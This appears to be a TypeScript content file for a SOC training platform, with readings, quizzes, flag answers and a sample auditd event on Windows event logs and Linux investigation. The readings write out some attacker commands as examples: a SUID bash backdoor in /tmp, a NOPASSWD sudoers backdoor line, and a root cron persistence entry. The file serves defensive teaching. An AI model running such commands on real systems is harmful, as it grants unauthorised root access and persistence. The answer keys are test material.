        "The Security audit log was cleared — critical P1, possible track-covering; escalate now",
        "The Security log hit its size limit and overwrote old events — low urgency, expected",
        "Audit policy was changed to stop logging — medium urgency, review during business hours",
      ],
      answer: 1,
      explanation:
        "Event ID 1102 = 'The audit log was cleared'. Legitimate administrators almost never need to clear the Security log. Clearing it is a common attacker tactic to erase the evidence of their actions before abandoning a compromised machine. The Saturday night timestamp makes it even more suspicious (attackers often act after business hours). This should trigger an immediate P1 response. Check your SIEM for any events that were forwarded before the clear, and investigate what happened on that DC in the preceding hours.",
      xp: 30,
    } satisfies QuestionTask,

    // -------------------------------------------------------------------------
    // Question 3 — 4688 command line
    // -------------------------------------------------------------------------
    {
      type: "question",
      id: "win-evtlogs-q3",
      question:
        "Event ID 4688 shows a new process created: NewProcessName = 'C:\\Windows\\System32\\cmd.exe', ParentProcessName = 'C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE', CommandLine = 'cmd.exe /c powershell -EncodedCommand JABjACA9...'. What does this indicate?",
      options: [
        "A user launched a command prompt from Word's developer ribbon to run a quick script",
        "Word spawned cmd.exe, which ran encoded PowerShell — consistent with a malicious macro payload",
        "A signed Office add-in updater shelled out to PowerShell to refresh its templates",
        "A developer's VBA project called cmd.exe and PowerShell during a normal debugging run",
      ],
      answer: 1,
      explanation:
        "Legitimate users do not spawn cmd.exe from inside Microsoft Word. This pattern — Office application → cmd.exe → PowerShell — is the textbook signature of a malicious macro (often delivered via phishing email). The '-EncodedCommand' flag hides the PowerShell payload in base64 to evade text-based detection. Decode the base64 string immediately to see what the script does (it is likely downloading a second-stage payload or establishing a reverse shell). This should be treated as a confirmed malware incident.",
      xp: 35,
    } satisfies QuestionTask,

    // -------------------------------------------------------------------------
    // Flag Task
    // -------------------------------------------------------------------------
    {
      type: "flag",
      id: "win-evtlogs-flag1",
      prompt:
        "Look at the log analysis event above (Event ID 4625 — password spray). What is the exact SubStatus value shown in the raw log that tells you the account exists but the password was wrong? Enter it exactly as shown in the raw log (format: 0x followed by eight hex digits).",
      answer: "0xC000006A",
      hint: "Find the 'winlog.event_data.SubStatus' field in the raw log — not the Status field, which is a more general failure code.",
      xp: 30,
    } satisfies FlagTask,

    // -------------------------------------------------------------------------
    // Question 4 — LogonType
    // -------------------------------------------------------------------------
    {
      type: "question",
      id: "win-evtlogs-q4",
      question:
        "Which LogonType in Event ID 4624 indicates that a user connected via Remote Desktop Protocol (RDP)?",
      options: [
        "LogonType 2 — Interactive (console)",
        "LogonType 3 — Network (file share)",
        "LogonType 10 — RemoteInteractive (RDP)",
        "LogonType 5 — Service",
      ],
      answer: 2,
      explanation:
        "LogonType 10 = RemoteInteractive, which is the value for RDP sessions. LogonType 2 is a console logon (physically at the keyboard). LogonType 3 is a network logon (accessing shared resources like file shares). LogonType 5 is a service account logon when a Windows service starts. Knowing these values is essential for understanding how a user or attacker accessed a system.",
      xp: 20,
    } satisfies QuestionTask,
  ],
};

// ---------------------------------------------------------------------------
// Room 3 — Linux Fundamentals for SOC Analysts
// ---------------------------------------------------------------------------

const linuxFundamentals: Room = {
  id: "linux-fundamentals",
  title: "Linux Fundamentals for SOC Analysts",
  description:
    "Most servers, cloud infrastructure, and security tools run on Linux. Learn the filesystem, permissions, users, processes, and key commands that every SOC analyst needs when investigating Linux systems.",
  difficulty: "beginner",
  category: "Endpoint Security",
  estimatedMinutes: 45,
  xp: 150,
  icon: "🐧",
  prerequisites: ["networking-fundamentals"],
  tasks: [
    // -------------------------------------------------------------------------
    // Reading 1 — Why Linux and the Filesystem
    // -------------------------------------------------------------------------
    {
      type: "reading",
      id: "linux-fund-r1",
      heading: "Linux — The Invisible OS Running the Internet",
      content: `You may never have seen Linux before. It does not have a start menu or colourful desktop icons. But here is the truth: Linux runs approximately **96% of the world's web servers**, virtually all cloud infrastructure (AWS, Azure, GCP), most IoT devices, Android smartphones, and — most relevant to you — nearly every security tool you will use as a SOC analyst, including Wazuh, Elastic Stack, and Splunk. Understanding Linux is not optional for a modern SOC analyst. It is as essential as knowing how to drive is for a police officer.\n\nThink of Linux like the engine of a car — most users never see it, but mechanics (and security analysts) need to understand it deeply.\n\n**The Filesystem Hierarchy — Everything Has a Place**\n\nWindows organises files into drives (C:, D:). Linux has one unified tree that starts at the **root directory** (\`/\`). Everything — files, devices, network interfaces — is a file or directory somewhere in this tree. Knowing where things live is critical for investigations:\n\n- **\`/\`** — Root. The top of the entire filesystem. Only root (the superuser) can write here.\n- **\`/etc\`** — "Et cetera" — system configuration files. Critical for SOC analysts:\n  - \`/etc/passwd\` — list of all user accounts\n  - \`/etc/shadow\` — hashed passwords (readable only by root)\n  - \`/etc/group\` — group membership\n  - \`/etc/sudoers\` — who can run commands as root\n  - \`/etc/ssh/sshd_config\` — SSH server configuration\n  - \`/etc/cron.d/\` — system-wide cron job definitions\n- **\`/var/log\`** — Variable data that grows: **log files**. SSH logs, authentication logs, web server logs, system logs. This directory is where you spend most of your time during Linux investigations.\n- **\`/tmp\`** — Temporary files. World-writable (any user can write here). Malware and attackers frequently drop files in /tmp because no special permissions are needed. Always check /tmp during an investigation.\n- **\`/home\`** — User home directories. \`/home/alice\` is Alice's personal space. Contains .ssh (SSH keys), .bash_history (command history), and personal files.\n- **\`/bin\`** and **\`/usr/bin\`** — Essential system commands and user programs. Things like \`ls\`, \`cat\`, \`grep\`, \`ps\`. Attackers sometimes replace legitimate binaries here with modified versions (rootkits).\n- **\`/sbin\`** and **\`/usr/sbin\`** — System administration binaries (commands usually run as root). \`iptables\`, \`useradd\`, \`fdisk\`.\n- **\`/proc\`** — A **virtual filesystem** that does not exist on disk. The kernel creates it in memory. It gives you a window into every running process and network connection:\n  - \`/proc/PID/exe\` — the executable for process with that PID\n  - \`/proc/PID/cmdline\` — the full command line that started the process\n  - \`/proc/PID/net/tcp\` — all active TCP connections\n  - \`/proc/PID/maps\` — memory map of the process\n- **\`/sys\`** — Another virtual filesystem exposing hardware and kernel settings.\n- **\`/dev\`** — Device files. \`/dev/sda\` is your hard drive. \`/dev/null\` is the "black hole" — data written here disappears.\n- **\`/opt\`** — Optional third-party software. Many security tools install here.\n- **\`/root\`** — The home directory of the root (superuser) account.\n\n**Why /tmp, /var/tmp, and /dev/shm Are Red Flags**\n\nThese three directories are writable by any user without special permissions:\n- \`/tmp\` — cleared on reboot on most systems\n- \`/var/tmp\` — persists across reboots (more dangerous for persistence)\n- \`/dev/shm\` — shared memory, backed by RAM, leaves no disk trace\n\nAttackers use these to download and execute malware. A process running from \`/tmp/update\` or \`/dev/shm/kworker\` should immediately raise suspicion — these paths are not where legitimate software lives.\n\n**Key Analyst Commands**\n\nWhen you SSH into a Linux system during an investigation, these commands give you situational awareness:\n\n- \`ls -la\` — List all files including hidden ones (starting with .) with permissions and timestamps\n- \`ps aux\` — List all running processes with their user, PID, and command line\n- \`netstat -tulpn\` or \`ss -tulpn\` — Show all open network ports and which process owns each one\n- \`find /tmp -type f -newer /etc/passwd\` — Find files in /tmp newer than the passwd file (recently created)\n- \`grep -r "Failed password" /var/log/\` — Search for SSH failures across all log files\n- \`cat /proc/1234/cmdline\` — See the full command line of process 1234\n- \`tail -f /var/log/auth.log\` — Watch the authentication log in real time\n- \`who\` and \`w\` — See who is currently logged in\n- \`last\` — Show recent login history`,
      checkpoint: {
        question:
          "A process called 'kworker' is using a lot of CPU on a web server. You want to see which executable it was really started from and its full command line. Which directory gives you that live view of the running process?",
        options: ["/proc", "/etc", "/var/log", "/opt"],
        answer: 0,
        explanation:
          "/proc is the virtual filesystem the kernel builds in memory for running processes: /proc/PID/exe points to the real executable and /proc/PID/cmdline holds the full command line. /etc holds configuration files, not live process state. /var/log holds log files that may mention the process, but it is not a live view of it. /opt is where third-party software is installed; a process can run from anywhere, so /opt tells you nothing about this one.",
      },
    } satisfies ReadingTask,

    // -------------------------------------------------------------------------
    // Reading 2 — Users, Permissions, and sudo
    // -------------------------------------------------------------------------
    {
      type: "reading",
      id: "linux-fund-r2",
      heading: "Users, File Permissions, and the sudo System",
      content: `Linux enforces the principle of least privilege through a strict permissions system. Every file and every process belongs to a specific user and group, and permissions control exactly who can do what. Understanding this is crucial both for securing systems and for investigating compromises.\n\n**Users and Groups**\n\nLinux user accounts are stored in \`/etc/passwd\`. Each line has seven colon-separated fields:\n\`\`\`\nalice:x:1001:1001:Alice Smith:/home/alice:/bin/bash\n  ^    ^  ^    ^      ^            ^            ^\n  |    |  |    |    Comment      Home          Shell\n username | UID  GID             directory\n          |\n        password (x = stored in /etc/shadow)\n\`\`\`\n\n- **UID (User ID)**: A number identifying the user. UID 0 = root (superuser). UID 1–999 = system accounts. UID 1000+ = human users.\n- **GID (Group ID)**: Primary group. Group memberships are in \`/etc/group\`.\n- **Shell**: The program that runs when the user logs in. \`/bin/bash\` is normal. \`/sbin/nologin\` or \`/bin/false\` means the account cannot log in interactively (used for service accounts).\n\nPasswords are never stored in \`/etc/passwd\` — only an 'x' placeholder. The actual hashed passwords are in \`/etc/shadow\`, readable only by root:\n\`\`\`\nalice:$6$salt$longhashstring...:18987:0:99999:7:::\n\`\`\`\nThe \`$6$\` prefix means SHA-512. Attackers who gain root access often dump /etc/shadow and attempt offline password cracking.\n\n**File Permissions**\n\nEvery file and directory has three permission sets:\n- **Owner (u)**: The user who owns the file\n- **Group (g)**: Members of the file's group\n- **Others (o)**: Everyone else\n\nAnd three permission types:\n- **r (read)**: Can view the file content or list directory contents\n- **w (write)**: Can modify the file or create/delete files in the directory\n- **x (execute)**: Can run the file as a program, or enter the directory (\`cd\` into it)\n\nExample output of \`ls -la\`:\n\`\`\`\n-rwxr-xr-- 1 alice devs 4096 Nov 14 10:32 deploy.sh\n ^^^ ^^^ ^^^\n  |   |   |\n Owner Group Others\n (alice)(devs)(everyone)\n\`\`\`\nReading: alice=rwx (can read/write/execute), devs group=r-x (can read and execute, not write), everyone else=r-- (read only).\n\nThe leading \`-\` means it is a regular file. \`d\` means directory, \`l\` means symbolic link.\n\n**Numeric Permission Notation**\nPermissions can also be expressed as a 3-digit octal number:\n- r = 4, w = 2, x = 1\n- Add them up: rwx = 7, rw- = 6, r-x = 5, r-- = 4, --- = 0\n- \`chmod 755 file\` = rwxr-xr-x (owner: full, group: read+execute, others: read+execute)\n- \`chmod 644 file\` = rw-r--r-- (owner: read+write, group: read, others: read) — standard for config files\n- \`chmod 777 file\` = rwxrwxrwx — **EVERYONE** can read, write, and execute. This is almost always a misconfiguration or a sign of an attacker deliberately weakening security.\n\n**SUID and SGID — Special Permission Bits**\nThese are advanced permission bits that are frequent attack targets:\n- **SUID (Set User ID)**: When set on an executable, it runs as the **file owner** regardless of who executes it. The classic example is \`/usr/bin/passwd\` — it runs as root (to write to /etc/shadow) even when an ordinary user runs it.\n  - ls shows 's' in the owner execute position: \`-rwsr-xr-x\`\n  - Dangerous if set on a shell or interpreter: \`find / -perm -4000\` lists all SUID files\n- **SGID (Set Group ID)**: Similar but runs as the file's group.\n\nAttackers sometimes copy \`/bin/bash\` to /tmp and set SUID on it: \`chmod 4755 /tmp/bash\`. Then any user can run \`/tmp/bash -p\` to get a root shell. Looking for unexpected SUID files is part of any Linux compromise investigation.\n\n**The sudo System**\n\n**sudo** (substitute user do) allows specific users to run commands as root (or as another user) without knowing the root password. It is configured in \`/etc/sudoers\` (edit only with \`visudo\` to prevent syntax errors that lock you out).\n\nExample sudoers entries:\n\`\`\`\nalice   ALL=(ALL:ALL) ALL         # alice can run anything as any user\nbob     ALL=(ALL) NOPASSWD: /usr/bin/systemctl restart nginx   # bob can restart nginx without a password\n%devops ALL=(ALL) ALL              # everyone in the devops group can run anything\n\`\`\`\n\nWhy sudo matters for security:\n1. **Audit trail**: Every sudo command is logged to \`/var/log/auth.log\` (or \`/var/log/secure\` on RHEL). This is how you know who ran what as root.\n2. **Attack target**: If an attacker can add their account to sudoers (or to the sudo/wheel group), they get permanent root access. Always monitor for changes to /etc/sudoers and /etc/group.\n3. **Common attacker escalation**: \`echo 'www-data ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers.d/backdoor\` — if the web server is compromised and the attacker can write to sudoers.d, they get root.\n\nCheck current sudo privileges: \`sudo -l\` (shows what the current user can run as sudo).\n\n**Reading sudo in auditd:** when the Linux audit system (auditd) records a program starting, \`uid\` is the real account that launched it and \`euid\` is the effective account it runs as — and because \`/usr/bin/sudo\` is itself SUID-root, an execve of sudo always shows \`euid=0\` before sudoers has decided anything, so whether the command was allowed must be confirmed in auth.log.`,
      checkpoint: {
        question: "'ls -la' shows this line: '-rwxr-x--- 1 root devs 2210 Nov 14 10:32 backup.sh'. Which numeric mode matches these permissions?",
        options: ["755", "750", "760", "740"],
        answer: 1,
        explanation:
          "Add r=4, w=2, x=1 for each set: owner rwx = 7, group r-x = 5, others --- = 0, so the mode is 750. 755 would also give others r-x, but the last set here is '---'. 760 would mean the group has rw-, but the group set is r-x (read and execute, no write). 740 would mean the group has r-- only, missing the execute bit that is shown.",
      },
    } satisfies ReadingTask,

    // -------------------------------------------------------------------------
    // Reading 3 — Processes, Cron, and SSH
    // -------------------------------------------------------------------------
    {
      type: "reading",
      id: "linux-fund-r3",
      heading: "Processes, Cron Jobs, SSH — Attacker Persistence on Linux",
      content: `Attackers do not want to be a one-time visitor — they want to come back whenever they choose. On Linux, the three most common persistence mechanisms are: processes (malware running continuously), cron jobs (scheduled malicious tasks), and SSH backdoors (added public keys). Knowing these lets you find persistence during an investigation.\n\n**Processes**\n\nEvery running program is a **process** with a unique **PID (Process ID)**. Processes have a parent-child relationship — when a process spawns another, the new process is its child. This forms a **process tree**.\n\nThe mother of all processes is **init** (PID 1, now typically systemd on modern Linux). Everything else descends from it. An attacker's malware process should logically descend from something — what is its parent? If \`kworker\` (which looks like a legitimate kernel worker) has a parent of \`bash\`, something renamed itself to hide.\n\nKey commands:\n- \`ps aux\` — shows all running processes. Columns: USER, PID, %CPU, %MEM, START, TIME, COMMAND.\n- \`ps auxf\` — shows the process tree (forest view)\n- \`pstree -p\` — visual process tree with PIDs\n- \`ls -la /proc/PID/exe\` — the real executable path for process PID (reveals malware that deleted its binary after starting)\n- \`cat /proc/PID/cmdline\` — full command line (null-separated, use \`tr '\\0' ' '\` to read)\n- \`lsof -p PID\` — all files and network connections open by PID\n- \`kill -9 PID\` — forcefully terminate a process (signal 9 = SIGKILL)\n\nSuspicious process indicators:\n- Process with a name resembling a system process (\`kworkerr\`, \`systemdd\`) but running from /tmp or /home\n- Process with no associated binary on disk (\`ls -la /proc/PID/exe\` → '(deleted)')\n- Process listening on an unusual port\n- Process using high CPU at odd hours\n\n**Cron — Scheduled Tasks**\n\n**cron** is the Linux task scheduler. It runs commands at specified times and intervals. Think of it like Windows Task Scheduler. Cron is a beloved attacker persistence tool because cron jobs survive reboots.\n\nCron configuration locations (all must be checked during an investigation):\n- \`/etc/crontab\` — system-wide cron table\n- \`/etc/cron.d/\` — directory of cron files (individual files per application/service)\n- \`/etc/cron.daily/\`, \`/etc/cron.hourly/\`, \`/etc/cron.weekly/\`, \`/etc/cron.monthly/\` — scripts run on those intervals\n- \`crontab -l\` — list the current user's personal cron jobs\n- \`crontab -l -u alice\` — list alice's cron jobs (as root)\n- \`/var/spool/cron/crontabs/\` — where user crontabs are stored on disk\n\nCron time format: \`* * * * * command\` = minute, hour, day of month, month, day of week. In the system-wide files (\`/etc/crontab\` and \`/etc/cron.d/*\`) there is a sixth field — the **user** the command runs as — between the schedule and the command: \`* * * * * root command\`. Personal crontabs (\`crontab -e\`) have no user field.\n- \`*/5 * * * * /tmp/.update\` — run /tmp/.update every 5 minutes. This is malicious.\n- \`0 3 * * * /bin/bash /home/alice/.bashrc.d/sync.sh\` — runs a script at 3 AM daily. Worth checking what that script does.\n\nAttacker cron persistence: \`echo '* * * * * root /tmp/.update 2>/dev/null' >> /etc/cron.d/sysupdate\` (note the user field, required in /etc/cron.d)\n\n**SSH — Secure Shell**\n\nSSH is how administrators remotely log into Linux servers. It is also an attacker's preferred remote access method because SSH connections are encrypted and blend in with legitimate admin traffic.\n\nKey SSH files:\n- \`/etc/ssh/sshd_config\` — SSH server configuration:\n  - \`PermitRootLogin no/yes\` — should be 'no' on production servers (attackers try to log in as root directly)\n  - \`PasswordAuthentication yes/no\` — password-based SSH should be disabled if key-based auth is available\n  - \`AllowUsers alice bob\` — whitelist of allowed users\n- \`~/.ssh/authorized_keys\` — public SSH keys that are allowed to log in as this user WITHOUT a password\n- \`~/.ssh/known_hosts\` — SSH servers this user has previously connected to\n- \`~/.bash_history\` — history of commands the user ran\n\n**SSH Backdoor — Most Common Attacker Persistence**\nAn attacker who gains temporary access to a Linux system often adds their own SSH public key to \`/root/.ssh/authorized_keys\` or \`/home/alice/.ssh/authorized_keys\`. This gives them permanent, password-free SSH access even after the original vulnerability is patched.\n\nInvestigation checklist:\n- \`cat /root/.ssh/authorized_keys\` — are there keys that do not belong?\n- \`cat /home/*/.ssh/authorized_keys\` — check all users\n- \`find /home -name authorized_keys -newer /etc/passwd\` — recently modified authorized_keys files\n- Compare with your known-good baseline if available\n\n**Package Management — What Gets Installed**\n\n- Debian/Ubuntu: \`apt\` — installs packages to standard paths (\`/usr/bin/\`, \`/usr/share/\`, etc.)\n- RHEL/CentOS/Fedora: \`yum\` or \`dnf\`\n- Check installed packages: \`dpkg -l\` (Debian) or \`rpm -qa\` (RHEL)\n- Attackers sometimes install tools via the package manager: \`apt install nmap netcat socat masscan\` — these would appear in the package list and in package manager logs.`,
    } satisfies ReadingTask,

    // -------------------------------------------------------------------------
    // Question 1
    // -------------------------------------------------------------------------
    {
      type: "question",
      id: "linux-fund-q1",
      question:
        "During a Linux investigation, you run 'find / -perm -4000 -type f 2>/dev/null' and find '/tmp/update_helper' in the results. Why is this significant?",
      options: [
        "Expected — package installers often stage SUID helper binaries in /tmp while they run",
        "Any user who runs it gets its owner's rights (likely root), so it may be a planted backdoor",
        "Low risk — the SUID bit affects the file's owner when they run it, not other users",
        "Leftover from a failed install — delete it at once so nobody can use it to get root",
      ],
      answer: 1,
      explanation:
        "The SUID (Set User ID) bit makes a program run as the file's owner, not as the user who starts it. Legitimate SUID binaries (like /usr/bin/passwd and /usr/bin/sudo) live in standard system directories, so a SUID file in world-writable /tmp with an innocent-looking name is a major red flag for a root backdoor. 'Installers stage SUID helpers in /tmp' is not normal practice — packages install SUID binaries to system paths. 'Affects the owner, not other users' has SUID backwards: it matters precisely when someone OTHER than the owner runs it. 'Delete it at once' is the right worry at the wrong time — first preserve and examine it ('ls -la /tmp/update_helper', 'file /tmp/update_helper', a hash and a copy), because the file is evidence of how the attacker escalated.",
      xp: 30,
    } satisfies QuestionTask,

    // -------------------------------------------------------------------------
    // Log Analysis — Suspicious sudo (linux_execve / sudo_command)
    // -------------------------------------------------------------------------
    {
      type: "log_analysis",
      id: "linux-fund-la1",
      heading: "Suspicious sudo Command Detected",
      context:
        "Your SIEM generated an alert: 'Privileged command execution detected on web-srv-01'. The auditd system on the server captured this event. The user 'www-data' is the web application service account — it should NEVER need to run interactive commands. Review the event.",
      event: {
        id: "linux-sudo-evt-001",
        ts: "2024-11-18T14:22:09.000Z",
        source: "linux_audit",
        vendor: "Linux auditd",
        event_type: "sudo_command",
        severity: "critical",
        hostname: "web-srv-01.corp.internal",
        description:
          "Service account www-data executed sudo bash — likely post-exploitation privilege escalation",
        mitre_technique: "T1548.003",
        mitre_tactic: "Privilege Escalation",
        process: {
          name: "sudo",
          pid: 9823,
          path: "/usr/bin/sudo",
          parent_name: "sh",
          parent_pid: 9821,
          cmdline: "sudo bash",
          user: "www-data",
        },
        raw: {
          "auditd.log.type": "SYSCALL",
          "auditd.log.uid": "33",
          "auditd.log.auid": "33",
          "auditd.log.euid": "0",
          "auditd.log.exe": "/usr/bin/sudo",
          "auditd.log.comm": "sudo",
          "auditd.log.key": "privileged_command",
          "auditd.log.success": "yes",
          "auditd.log.arch": "x86_64",
          "auditd.log.syscall": "execve",
          "process.args": ["sudo", "bash"],
          "host.os.type": "linux",
          "host.hostname": "web-srv-01.corp.internal",
          "@timestamp": "2024-11-18T14:22:09.000Z",
        },
      } satisfies TelemetryEvent,
      questions: [
        {
          question:
            "Compare the uid and euid fields in this auditd record. What do they tell you about what happened?",
          options: [
            "uid and euid are the login ID and the audit ID of one session, so this is an ordinary web process and no privilege changed",
            "uid is www-data, and euid is root only because sudo is SUID-root; www-data tried sudo, but the grant must be checked in auth.log",
            "euid shows the privilege sudo asked for rather than one it received, so this records a request that sudoers refused",
            "uid is www-data and euid is root, so this record on its own confirms that www-data is now running a root bash shell",
          ],
          answer: 1,
          explanation:
            "In auditd, 'uid' is the real account that started the program (here www-data, the web-server account) and 'euid' is the effective account it runs as (root). The executable is /usr/bin/sudo, which is SUID-root, so its execve always runs as root whether or not sudoers then allows www-data to run bash; success=yes only means the execve syscall worked. So the record proves www-data invoked sudo to try to become root. Confirm the outcome in /var/log/auth.log (a sudo line with 'COMMAND=/bin/bash' vs 'user NOT in sudoers') or a following execve of /bin/bash running as root. 'Login ID and audit ID of one session' confuses uid/euid with auid — euid is the effective identity, and it differs from uid here. 'The privilege sudo asked for' is wrong: euid is the identity the process actually holds, and nothing in this record shows a refusal. 'Confirms a root bash shell' is the common misreading — the program recorded is sudo, not bash, so the shell is not proven yet. Either way, a web service account running sudo bash points to an exploited web application and an escalation attempt.",
          xp: 35,
        },
      ],
    } satisfies LogAnalysisTask,

    // -------------------------------------------------------------------------
    // Flag Task
    // -------------------------------------------------------------------------
    {
      type: "flag",
      id: "linux-fund-flag1",
      prompt:
        "The alert context names the service account, but detection rules usually match on numeric IDs. In the auditd event above, find the real (not effective) user ID of the account that launched sudo, and enter that number.",
      answer: "33",
      hint: "auditd keeps two identities on every record: who launched the program, and who the program runs as. You want the first one.",
      xp: 25,
    } satisfies FlagTask,

    // -------------------------------------------------------------------------
    // Question 2
    // -------------------------------------------------------------------------
    {
      type: "question",
      id: "linux-fund-q2",
      question:
        "A file-integrity alert reports that the mode of /etc/shadow on a web server changed from 640 to 777. What is the main risk?",
      options: [
        "Little risk — the file holds hashes, and a hash cannot be turned back into a password",
        "Any local user or hijacked service can now read every password hash and crack them offline",
        "Root's own line stays private, because each line in the file keeps its own permissions",
        "Mainly integrity — others gained write access, but users could already read the hashes",
      ],
      answer: 1,
      explanation:
        "777 = rwxrwxrwx, so the last digit (7) gives 'others' — every account on the box, including a compromised web service — read, write and execute. /etc/shadow is meant to be readable only by root because it holds the password hashes, and attackers copy it for offline cracking. 'A hash cannot be turned back' misses the point: hashes are cracked offline by guessing, which is exactly why shadow is locked down. 'Root's line stays private' is wrong — permissions apply to the whole file. 'Every user could already read the hashes' confuses /etc/shadow with /etc/passwd, which is world-readable but holds only an 'x' placeholder. The new write access is an extra danger (a password hash could be replaced), which is why permission changes on /etc/shadow, /etc/sudoers and /etc/passwd should always be monitored.",
      xp: 30,
    } satisfies QuestionTask,

    // -------------------------------------------------------------------------
    // Question 3
    // -------------------------------------------------------------------------
    {
      type: "question",
      id: "linux-fund-q3",
      question:
        "An analyst finds this line in /etc/cron.d/sysupdate on a compromised web server: '*/5 * * * * root /tmp/.cache 2>/dev/null'. What does this do and why is it malicious?",
      options: [
        "A routine job that refreshes a package-metadata cache as root every five minutes",
        "Every 5 minutes root runs a hidden file from /tmp with errors silenced — persistence",
        "It runs as whoever created the file — the 'root' field is a comment, not the run-as user",
        "'*/5' applies to the hour field, so the job fires once every five hours",
      ],
      answer: 1,
      explanation:
        "Cron's schedule fields are minute, hour, day of month, month, day of week, so '*/5 * * * *' means every 5 minutes. In /etc/cron.d files the sixth field is the run-as user — here 'root'. '/tmp/.cache' is a hidden file (dot prefix) in world-writable /tmp, and '2>/dev/null' silences errors: textbook attacker persistence that survives reboots. 'A routine package-metadata job' does not fit — package tools run from system paths, not a hidden file in /tmp. 'Runs as whoever created the file' ignores the user field that system cron files require. '*/5 applies to the hour field' misreads the position: the first field is minutes. Response: preserve copies of the file and the cron entry, stop the process, remove /etc/cron.d/sysupdate and /tmp/.cache, then find out how the attacker got in.",
      xp: 30,
    } satisfies QuestionTask,
  ],
};

// ---------------------------------------------------------------------------
// Room 4 — Linux Log Analysis
// ---------------------------------------------------------------------------

const linuxLogAnalysis: Room = {
  id: "linux-log-analysis",
  title: "Linux Log Analysis",
  description:
    "Learn to read the logs Linux systems generate and identify attack patterns: SSH brute force, privilege escalation, persistence via cron, and web application attacks. Master auth.log, auditd, and journald.",
  difficulty: "intermediate",
  category: "Log Analysis",
  estimatedMinutes: 45,
  xp: 200,
  icon: "🔍",
  prerequisites: ["linux-fundamentals", "log-entry-anatomy"],
  tasks: [
    // -------------------------------------------------------------------------
    // Reading 1 — The Linux Logging Ecosystem
    // -------------------------------------------------------------------------
    {
      type: "reading",
      id: "linux-logs-r1",
      heading: "The Linux Logging Ecosystem — Where Every Event Gets Written",
      content: `If Windows Event Logs are the black box of a Windows system, then the files in \`/var/log/\` are the black box of a Linux system. But Linux logging is more decentralised — different components write to different files, and you need to know which file contains which type of event. Think of it like a hospital: the admissions desk logs patient arrivals (auth.log), the pharmacy logs prescriptions (application logs), and the ICU has its own records (kernel log). You need to know which department to check based on what you are investigating.\n\n**The Three Layers of Linux Logging**\n\n**Layer 1: syslog / rsyslog**\nThe original Unix logging system. Programs send log messages to the \`syslog\` facility using a standard format. The syslog daemon (\`rsyslogd\` on most modern systems) receives these messages and routes them to the appropriate files based on **facility** (auth, kern, daemon, etc.) and **severity** (emerg, alert, crit, err, warning, notice, info, debug).\n\nConfiguration: \`/etc/rsyslog.conf\` and files in \`/etc/rsyslog.d/\`\n\n**Layer 2: systemd journal (journald)**\nOn modern Linux systems (Ubuntu 16+, RHEL 7+, Debian 8+), **systemd-journald** collects logs from all systemd units (services), the kernel, and early boot. It stores them in a binary format in \`/run/log/journal/\`. You query it with the \`journalctl\` command:\n- \`journalctl -u sshd\` — all SSH service logs\n- \`journalctl -p err\` — only error-level and above\n- \`journalctl --since "2024-11-14 00:00" --until "2024-11-14 23:59"\` — time range\n- \`journalctl -f\` — follow (like tail -f)\n- \`journalctl -u sshd -n 50\` — last 50 lines of SSH logs\n\n**Layer 3: auditd**\nThe Linux Audit Framework is a separate, security-focused logging system that hooks into the kernel. Unlike syslog (which depends on userspace programs to call syslog), auditd monitors system calls at the kernel level — meaning a program cannot avoid being recorded simply by not logging. It is not tamper-proof, though: root can stop auditd or flush its rules unless they are locked with \`auditctl -e 2\`, and audit.log is an ordinary root-writable file, so forward it off-host. It logs to \`/var/log/audit/audit.log\` (or sometimes \`audit/\` directory).\n\n**Key Log Files and What They Contain**\n\n**\`/var/log/auth.log\`** (Debian/Ubuntu) or **\`/var/log/secure\`** (RHEL/CentOS)\nThis is your primary investigation target for authentication events:\n- SSH successful logins: \`Accepted password for alice from 10.0.0.5 port 42341 ssh2\`\n- SSH failed logins: \`Failed password for root from 185.220.101.45 port 56234 ssh2\`\n- Invalid usernames: \`Invalid user admin from 185.220.101.45 port 45678\`\n- Sudo events: \`sudo: alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/cat /etc/shadow\`\n- PAM (Pluggable Authentication Module) events: password changes, account lockouts\n- su (switch user) events\n\n**\`/var/log/syslog\`** (Debian/Ubuntu) or **\`/var/log/messages\`** (RHEL)\nGeneral system log. Services log start/stop events here. Can contain:\n- cron job executions: \`CRON[12345]: (root) CMD (/tmp/.cache)\`\n- Network interface changes\n- Service restarts\n- General daemon activity\n\n**\`/var/log/kern.log\`**\nKernel messages — hardware issues, driver errors, OOM (Out of Memory) kills. For security, useful for detecting kernel-level rootkits or unusual kernel module loading.\n\n**\`/var/log/cron\`** or \`/var/log/syslog\` (cron messages go here on Debian)\nCron job execution records. Every time cron runs a job, it logs it here. During an investigation, check if any unexpected cron jobs ran (especially at unusual hours).\n\n**\`/var/log/apache2/\`** (Apache) or **\`/var/log/nginx/\`** (Nginx)\n- **access.log**: Every HTTP request — client IP, timestamp, URL, HTTP method, response code, user agent\n- **error.log**: Application errors, 404s that might indicate scanning, PHP errors that might reveal injection attempts\n\nApache access.log format example:\n\`\`\`\n192.168.1.100 - - [14/Nov/2024:10:32:01 +0000] "GET /admin/config.php HTTP/1.1" 200 4521 "-" "Mozilla/5.0..."\n       ^                  ^                      ^                          ^     ^\n   Client IP          Timestamp              Request                   Status  Bytes\n\`\`\`\n\n**\`/var/log/faillog\`**\nFailed login counts per user account. Can be viewed with the \`faillog\` command. Shows which accounts are being targeted by brute force.\n\n**Useful Log Analysis Commands**\n\n\`\`\`bash\n# Count failed SSH attempts by source IP\ngrep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn | head -20\n\n# Show successful SSH logins\ngrep "Accepted" /var/log/auth.log\n\n# Show all sudo commands run in the last week\ngrep "sudo:" /var/log/auth.log | grep "COMMAND"\n\n# Watch auth.log in real time during an attack\ntail -f /var/log/auth.log\n\n# Find all cron jobs that ran today\ngrep "$(date +%b\\ %e)" /var/log/syslog | grep CRON\n\`\`\``,
      checkpoint: {
        question:
          "According to the reading, what is the primary log file for SSH authentication events on Debian/Ubuntu systems?",
        options: ["/var/log/auth.log", "/var/log/secure", "/var/log/kern.log", "/var/log/messages"],
        answer: 0,
        explanation:
          "/var/log/auth.log is the Debian/Ubuntu authentication log; the RHEL/CentOS equivalent is /var/log/secure.",
      },
    } satisfies ReadingTask,

    // -------------------------------------------------------------------------
    // Reading 2 — SSH Attack Detection
    // -------------------------------------------------------------------------
    {
      type: "reading",
      id: "linux-logs-r2",
      heading: "SSH Attack Detection — Reading the Patterns in auth.log",
